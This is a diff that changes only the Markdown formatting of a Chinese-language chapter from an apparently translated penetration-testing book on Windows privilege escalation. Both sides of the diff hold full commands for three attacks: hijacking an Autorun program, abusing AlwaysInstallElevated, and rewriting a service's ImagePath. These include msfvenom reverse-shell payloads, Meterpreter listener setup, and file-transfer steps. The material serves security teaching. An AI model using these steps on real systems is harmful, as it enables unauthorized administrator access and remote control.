@@ -44,7 +44,7 @@
 
 请注意，程序和应用程序并不要求将配置存储在 Windows 注册表中，它们可能选择将配置存储在程序安装目录中。在搜索程序和应用程序中的配置错误和漏洞时，必须记住这一点。
 
-我们可以通过运行**regedit.exe**可执行文件来访问 Windows 注册表。可以通过 Windows 命令提示符或**运行**工具来完成，如下图所示：
+我们可以通过运行`regedit.exe`可执行文件来访问 Windows 注册表。可以通过 Windows 命令提示符或**运行**工具来完成，如下图所示：
 
 ![图 9.1 – 启动 regedit.exe](img/B17389_09_001.jpg)
 
@@ -100,7 +100,7 @@ Autorun 是 AutoPlay 的一个伴随功能，通常用于自动启动特定程�
 
 1.  这个过程的第一步涉及识别目标系统上的 Autorun 应用程序。可以通过在 Windows 命令 shell 中运行以下命令来完成：
 
-    **reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run**
+    `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
 
     如下截图所示，这将显示一个 Autorun 应用程序列表：
 
@@ -108,29 +108,29 @@ Autorun 是 AutoPlay 的一个伴随功能，通常用于自动启动特定程�
 
     图 9.3 – Windows 注册表 Autorun 程序
 
-1.  我们还可以使用 **accesschk** 实用程序识别已配置为 Autorun 的应用程序及其各自的权限。可以从这里下载 **accesschk** 可执行文件：[`docs.microsoft.com/en-us/sysinternals/downloads/accesschk`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)。
+1.  我们还可以使用 `accesschk` 实用程序识别已配置为 Autorun 的应用程序及其各自的权限。可以从这里下载 `accesschk` 可执行文件：[`docs.microsoft.com/en-us/sysinternals/downloads/accesschk`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)。
 
-    将 **accesschk** 可执行文件下载到我们的 Kali 虚拟机后，我们需要将其传输到目标系统。可以通过 Meterpreter 运行以下命令完成：
+    将 `accesschk` 可执行文件下载到我们的 Kali 虚拟机后，我们需要将其传输到目标系统。可以通过 Meterpreter 运行以下命令完成：
 
-    **upload /<PATH-TO-EXECUTABLE/accesschk64.exe**
+    `upload /<PATH-TO-EXECUTABLE/accesschk64.exe`
 
-    如果使用标准命令 shell，可以使用 **certutil** 实用程序将二进制文件传输到目标系统。
+    如果使用标准命令 shell，可以使用 `certutil` 实用程序将二进制文件传输到目标系统。
 
-    在将 **accesschk.exe** 二进制文件上传到目标系统后，我们可以通过在 Windows 命令 shell 中运行以下命令来枚举所有 Autorun 程序的列表：
+    在将 `accesschk.exe` 二进制文件上传到目标系统后，我们可以通过在 Windows 命令 shell 中运行以下命令来枚举所有 Autorun 程序的列表：
 
-    **.\accesschk64.exe -wvu "c:\Program Files\ Autorun Program"**
+    `.\accesschk64.exe -wvu "c:\Program Files\ Autorun Program"`
 
     如下截图所示，这将突出显示一个 Autorun 程序列表、它们的访问权限以及各自的目录：
 
     注意
 
-    **RW** 表示组具有读写权限，因此可以更改程序目录的内容。
+    `RW` 表示组具有读写权限，因此可以更改程序目录的内容。
 
     ![图 9.4 – accesschk Autorun 程序](img/B17389_09_004.jpg)
 
     图 9.4 – accesschk Autorun 程序
 
-    如前面的截图所示，我们识别了**program.exe**可执行文件及其权限。在这种情况下，该可执行文件具有**NT AUTHORITY \SYSTEM**访问权限。我们可以利用这个程序通过替换可执行文件为 Meterpreter shell 可执行文件来提升我们的权限，当管理员登录时，Meterpreter shell 会自动执行，从而为我们提供一个提升的 Meterpreter 会话。
+    如前面的截图所示，我们识别了`program.exe`可执行文件及其权限。在这种情况下，该可执行文件具有`NT AUTHORITY \SYSTEM`访问权限。我们可以利用这个程序通过替换可执行文件为 Meterpreter shell 可执行文件来提升我们的权限，当管理员登录时，Meterpreter shell 会自动执行，从而为我们提供一个提升的 Meterpreter 会话。
 
     下一步将涉及生成反向 shell 可执行文件，并将其上传到目标系统。
 
@@ -138,9 +138,9 @@ Autorun 是 AutoPlay 的一个伴随功能，通常用于自动启动特定程�
 
     这种权限提升技术要求管理员登录系统，才能执行 Autorun 程序。
 
-1.  我们可以使用**msfvenom**生成 Meterpreter 有效载荷并将其保存为可执行文件。这可以通过在 Kali 中运行以下命令来完成：
+1.  我们可以使用`msfvenom`生成 Meterpreter 有效载荷并将其保存为可执行文件。这可以通过在 Kali 中运行以下命令来完成：
 
-    **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER-IP> LPORT=<PORT> -f exe > /home/kali/Desktop/program.exe**
+    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER-IP> LPORT=<PORT> -f exe > /home/kali/Desktop/program.exe`
 
     注
 
@@ -152,15 +152,15 @@ Autorun 是 AutoPlay 的一个伴随功能，通常用于自动启动特定程�
 
 1.  在上传 Meterpreter 有效载荷之前，我们需要重命名原始的二进制文件。然而，建议先备份原始二进制文件，以防万一过程未按预期执行。可以通过在 Meterpreter 会话中运行以下命令来重命名原始可执行文件：
 
-    **mv program.exe program_backup.exe**
+    `mv program.exe program_backup.exe`
 
 1.  现在，我们可以通过在 Meterpreter 会话中运行以下命令，将 Meterpreter 可执行文件上传到目标系统的 Autorun 程序目录：
 
-    **upload /home/kali/Desktop/program.exe**
+    `upload /home/kali/Desktop/program.exe`
 
-    如果你使用的是标准命令行 shell，你可以使用**certutil**工具将二进制文件传输到目标系统。
+    如果你使用的是标准命令行 shell，你可以使用`certutil`工具将二进制文件传输到目标系统。
 
-    如以下截图所示，这将把 Meterpreter 可执行文件上传到**Autorun Program**目录：
+    如以下截图所示，这将把 Meterpreter 可执行文件上传到`Autorun Program`目录：
 
     ![图 9.5 – 上传自定义 Autorun 程序](img/B17389_09_005.jpg)
 
@@ -170,13 +170,13 @@ Autorun 是 AutoPlay 的一个伴随功能，通常用于自动启动特定程�
 
 1.  现在，我们需要使用 Metasploit 设置 Meterpreter 监听器。这可以通过在 Metasploit 控制台中运行以下命令来完成：
 
-    **use /exploit/multi/handler**
+    `use /exploit/multi/handler`
 
 1.  下一步是指定我们使用 MSFvenom 创建二进制文件时所用的有效载荷。可以通过运行以下命令来完成：
 
-    **set payload /windows/x64/meterpreter/reverse_tcp**
+    `set payload /windows/x64/meterpreter/reverse_tcp`
 
-    现在，我们需要配置模块选项。在这种情况下，我们需要配置**LHOST**和**LPORT**选项，如以下截图所示：
+    现在，我们需要配置模块选项。在这种情况下，我们需要配置`LHOST`和`LPORT`选项，如以下截图所示：
 
     ![图 9.6 – Meterpreter 负载选项](img/B17389_09_008.jpg)
 
@@ -186,7 +186,7 @@ Autorun 是 AutoPlay 的一个伴随功能，通常用于自动启动特定程�
 
 1.  在设置模块选项后，我们可以通过运行以下命令启动监听器：
 
-    **run**
+    `run`
 
     监听器将监听我们通过 MSFvenom 生成的负载发出的任何传入连接。
 
@@ -202,9 +202,9 @@ Autorun 是 AutoPlay 的一个伴随功能，通常用于自动启动特定程�
 
 # 利用 Always Install Elevated 功能
 
-AlwaysInstallElevated 是一个 Windows 功能，它允许没有管理员权限的标准用户帐户以管理员权限安装打包为**Microsoft Windows Installer**（**MSI**）格式的软件。
+AlwaysInstallElevated 是一个 Windows 功能，它允许没有管理员权限的标准用户帐户以管理员权限安装打包为`Microsoft Windows Installer`（**MSI**）格式的软件。
 
-我们可以利用这个配置通过生成一个自定义的 MSI 格式可执行文件来提升我们的权限。然后，我们可以使用**msiexec**工具执行该 MSI 可执行文件，从而获得提升的会话。
+我们可以利用这个配置通过生成一个自定义的 MSI 格式可执行文件来提升我们的权限。然后，我们可以使用`msiexec`工具执行该 MSI 可执行文件，从而获得提升的会话。
 
 该功能在公司和组织中常常配置错误，主要是为了方便员工访问，或者管理员在设置工作站后错误地将其启用。无论哪种情况，这项技术都能让我们以相对简单的方式提升权限。
 
@@ -220,11 +220,11 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
 1.  第一步是确定目标系统是否启用了 AlwaysInstallElevated 功能。可以通过在 Windows 命令行中运行以下注册表查询来完成：
 
-    **reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**
+    `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
 
-    **reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**
+    `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
 
-    如下截图所示，这将输出 AlwaysInstallElevated 功能的注册表配置及其值。如果以下截图中突出显示的值设置为**0**，则该功能被禁用；如果值设置为**1**，则该功能已启用：
+    如下截图所示，这将输出 AlwaysInstallElevated 功能的注册表配置及其值。如果以下截图中突出显示的值设置为`0`，则该功能被禁用；如果值设置为`1`，则该功能已启用：
 
     ![图 9.8 – 注册表查询 – AlwaysInstallElevated](img/B17389_09_006.jpg)
 
@@ -236,7 +236,7 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
 1.  过程中的第二步是使用 MSFvenom 生成自定义的 MSI 可执行文件。可以通过在 Kali 中运行以下命令来完成此操作：
 
-    **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f msi > setup.msi**
+    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f msi > setup.msi`
 
 1.  生成有效载荷后，我们可以将其上传到 Windows 临时目录，可以在以下位置找到它：
 
@@ -244,11 +244,11 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
     现在，我们可以通过运行以下命令，使用 Meterpreter 将自定义 MSI 可执行文件上传到目标系统的临时目录：
 
-    **upload /home/kali/Desktop/setup.msi**
+    `upload /home/kali/Desktop/setup.msi`
 
-    如果你正在使用标准命令行，可以使用**certutil**工具将二进制文件传输到目标系统。
+    如果你正在使用标准命令行，可以使用`certutil`工具将二进制文件传输到目标系统。
 
-    如下图所示，这将把 Meterpreter 可执行文件上传到**Autorun Program**目录：
+    如下图所示，这将把 Meterpreter 可执行文件上传到`Autorun Program`目录：
 
     ![图 9.9 – Meterpreter – 上传自定义 MSI    ](img/B17389_09_009.jpg)
 
@@ -256,13 +256,13 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
 1.  现在，我们需要使用 Metasploit 设置 Meterpreter 监听器。可以通过在 Metasploit 控制台中运行以下命令来完成此操作：
 
-    **use /exploit/multi/handler**
+    `use /exploit/multi/handler`
 
 1.  下一步是指定我们使用 MSFvenom 创建自定义 MSI 可执行文件时使用的有效载荷。可以通过运行以下命令来完成此操作：
 
-    **set payload /windows/x64/meterpreter/reverse_tcp**
+    `set payload /windows/x64/meterpreter/reverse_tcp`
 
-    现在，我们需要配置模块选项。在这种情况下，我们需要配置**LHOST**和**LPORT**选项，如下图所示：
+    现在，我们需要配置模块选项。在这种情况下，我们需要配置`LHOST`和`LPORT`选项，如下图所示：
 
     ![图 9.10 – Meterpreter 有效载荷选项    ](img/B17389_09_010.jpg)
 
@@ -270,13 +270,13 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
     在设置模块选项后，我们可以通过运行以下命令来启动监听器：
 
-    **run**
+    `run`
 
-    监听器将监听来自我们使用**MSFvenom**生成的自定义 MSI 可执行文件的任何传入连接。
+    监听器将监听来自我们使用`MSFvenom`生成的自定义 MSI 可执行文件的任何传入连接。
 
-1.  下一步是通过**msiexec**工具执行自定义的 MSI 可执行文件。可以通过在 Windows 命令行中运行以下命令来完成此操作：
+1.  下一步是通过`msiexec`工具执行自定义的 MSI 可执行文件。可以通过在 Windows 命令行中运行以下命令来完成此操作：
 
-    **msiexec /quiet /qn /i C:/temp/setup.msi**
+    `msiexec /quiet /qn /i C:/temp/setup.msi`
 
     如果成功，这将在我们的监听器上生成一个提升的 Meterpreter 会话，如下图所示：
 
@@ -286,9 +286,9 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
 1.  此过程还将把当前的标准用户添加到本地管理员组中。我们可以通过在 Windows 命令行中运行以下命令来确认这一点：
 
-    **net localgroup administrators**
+    `net localgroup administrators`
 
-    如下图所示，**Win7**用户已被添加到本地管理员组中，并且具有管理员权限：
+    如下图所示，`Win7`用户已被添加到本地管理员组中，并且具有管理员权限：
 
 ![图 9.12 – 本地管理员组成员](img/B17389_09_012.jpg)
 
@@ -302,11 +302,11 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
     **使用 exploit/windows/local/always_install_elevated**
 
-1.  加载模块后，您需要为该模块设置 **SESSION** 选项。**SESSION** 选项需要您的 Meterpreter 会话的会话 ID。可以通过运行以下命令来完成：
+1.  加载模块后，您需要为该模块设置 `SESSION` 选项。`SESSION` 选项需要您的 Meterpreter 会话的会话 ID。可以通过运行以下命令来完成：
 
     **设置 SESSION <SESSION-ID>**
 
-    如以下截图所示，**SESSION** 选项应反映您设置的会话 ID：
+    如以下截图所示，`SESSION` 选项应反映您设置的会话 ID：
 
     ![图 9.13 – Metasploit 模块选项    ](img/B17389_09_013.jpg)
 
@@ -328,45 +328,45 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
 这种权限提升技术涉及使用标准用户帐户识别并修改服务的注册表值。在许多情况下，写入或修改 Windows 注册表的值仅限管理员权限。然而，您可能会遇到可以由标准用户帐户修改的服务。
 
-我们可以利用这个漏洞，将服务的 **ImagePath**（应用程序路径）修改为自定义可执行文件的路径。这样，当服务重新启动时，我们就能获得提升的会话。
+我们可以利用这个漏洞，将服务的 `ImagePath`（应用程序路径）修改为自定义可执行文件的路径。这样，当服务重新启动时，我们就能获得提升的会话。
 
 该技术只会在至少有一个或多个服务具有弱权限的系统上有效。
 
 利用该漏洞进行攻击的过程可以通过以下步骤完成：
 
-1.  该过程的第一步是识别可以修改注册表值的服务列表。在这种情况下，我们可以使用 **winPEAS** 枚举工具枚举具有注册表值及其各自权限的服务列表。
+1.  该过程的第一步是识别可以修改注册表值的服务列表。在这种情况下，我们可以使用 `winPEAS` 枚举工具枚举具有注册表值及其各自权限的服务列表。
 
     可以从以下 GitHub 仓库下载 winPEAS 二进制文件：[`github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)。
 
-    确保根据目标操作系统的架构下载正确的二进制文件；架构特定的二进制文件可以在 **binaries** 文件夹中找到，如以下截图所示：
+    确保根据目标操作系统的架构下载正确的二进制文件；架构特定的二进制文件可以在 `binaries` 文件夹中找到，如以下截图所示：
 
     ![图 9.15 – winPEAS 二进制文件    ](img/B17389_09_015.jpg)
 
     图 9.15 – winPEAS 二进制文件
 
-    下载二进制文件到我们的 Kali 虚拟机后，我们需要将 **winPEAS.exe** 二进制文件传输到目标虚拟机。
+    下载二进制文件到我们的 Kali 虚拟机后，我们需要将 `winPEAS.exe` 二进制文件传输到目标虚拟机。
 
-1.  我们可以通过运行以下命令，将 **winPEAS.exe** 二进制文件通过 Meterpreter 传输到目标系统：
+1.  我们可以通过运行以下命令，将 `winPEAS.exe` 二进制文件通过 Meterpreter 传输到目标系统：
 
     **上传 /<PATH-To-BINARY>/winPEASx64.exe**
 
-    如果使用的是标准命令行 shell，可以使用 **certutil** 工具将二进制文件传输到目标系统。
+    如果使用的是标准命令行 shell，可以使用 `certutil` 工具将二进制文件传输到目标系统。
 
-1.  上传 **winPEAS.exe** 二进制文件到目标系统后，可以通过运行以下命令枚举服务注册表值列表：
+1.  上传 `winPEAS.exe` 二进制文件到目标系统后，可以通过运行以下命令枚举服务注册表值列表：
 
-    **.\winPEASx64.exe servicesinfo**
+    `.\winPEASx64.exe servicesinfo`
 
-    如下图所示，这将列出可以修改的服务注册表值。在我们的案例中，可以识别出具有所需权限的 **regsvc** 服务：
+    如下图所示，这将列出可以修改的服务注册表值。在我们的案例中，可以识别出具有所需权限的 `regsvc` 服务：
 
     ![图 9.16 – winPEAS 不安全的注册表服务    ](img/B17389_09_016.jpg)
 
     图 9.16 – winPEAS 不安全的注册表服务
 
-    在这种情况下，我们可以修改服务并更改 **ImagePath** 为我们自定义 Meterpreter 可执行文件的路径。
+    在这种情况下，我们可以修改服务并更改 `ImagePath` 为我们自定义 Meterpreter 可执行文件的路径。
 
-1.  过程中的第二步是使用**MSFvenom**生成自定义的 Meterpreter 可执行文件。可以通过在 Kali 中运行以下命令完成：
+1.  过程中的第二步是使用`MSFvenom`生成自定义的 Meterpreter 可执行文件。可以通过在 Kali 中运行以下命令完成：
 
-    **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f exe > shell.exe**
+    `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f exe > shell.exe`
 
 1.  生成可执行文件后，我们可以将其上传到 Windows 临时目录，位置如下：
 
@@ -376,7 +376,7 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
     **上传 /home/kali/Desktop/shell.exe**
 
-    如果使用的是标准命令行 shell，可以使用 **certutil** 工具将二进制文件传输到目标系统。
+    如果使用的是标准命令行 shell，可以使用 `certutil` 工具将二进制文件传输到目标系统。
 
     如下图所示，这将把 Meterpreter 可执行文件上传到临时目录：
 
@@ -386,13 +386,13 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
 1.  现在，我们需要使用 Metasploit 设置 Meterpreter 监听器。可以通过在 Metasploit 控制台中运行以下命令来完成：
 
-    **use /exploit/multi/handler**
+    `use /exploit/multi/handler`
 
-1.  下一步是指定我们用来创建自定义可执行文件的有效载荷，使用**MSFvenom**来完成。可以通过运行以下命令来实现：
+1.  下一步是指定我们用来创建自定义可执行文件的有效载荷，使用`MSFvenom`来完成。可以通过运行以下命令来实现：
 
-    **set payload /windows/x64/meterpreter/reverse_tcp**
+    `set payload /windows/x64/meterpreter/reverse_tcp`
 
-    现在，我们需要配置模块选项。在这种情况下，我们需要配置 **LHOST** 和 **LPORT** 选项，如下图所示：
+    现在，我们需要配置模块选项。在这种情况下，我们需要配置 `LHOST` 和 `LPORT` 选项，如下图所示：
 
     ![图 9.18 – Meterpreter 有效载荷选项    ](img/B17389_09_018.jpg)
 
@@ -400,19 +400,19 @@ Always Install Elevated 功能配置在 Windows 注册表中，因此我们可�
 
 1.  设置模块选项后，我们可以通过运行以下命令来启动监听器：
 
-    **run**
+    `run`
 
-    监听器将监听来自我们使用 **MSFvenom** 生成的自定义可执行文件的任何传入连接。
+    监听器将监听来自我们使用 `MSFvenom` 生成的自定义可执行文件的任何传入连接。
 
-1.  现在，我们可以修改目标注册表服务的 **ImagePath** 值，并将其设置为我们生成的自定义可执行文件的路径。可以通过在目标的 Windows 命令行中运行以下命令来完成：
+1.  现在，我们可以修改目标注册表服务的 `ImagePath` 值，并将其设置为我们生成的自定义可执行文件的路径。可以通过在目标的 Windows 命令行中运行以下命令来完成：
 
-    **reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Temp\shell.exe" /f**
+    `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Temp\shell.exe" /f`
 
     如果成功，新的值应该被写入。现在，服务将在下次启动或重启时执行我们的自定义可执行文件。
 
 1.  我们可以通过在 Windows 命令行中运行以下命令来启动服务：
 
-    **sc start regsvc**
+    `sc start regsvc`
 
 1.  服务现在将执行我们的自定义可执行文件，并在我们设置的监听器上提供提升权限的 Meterpreter 会话，如下图所示：
 
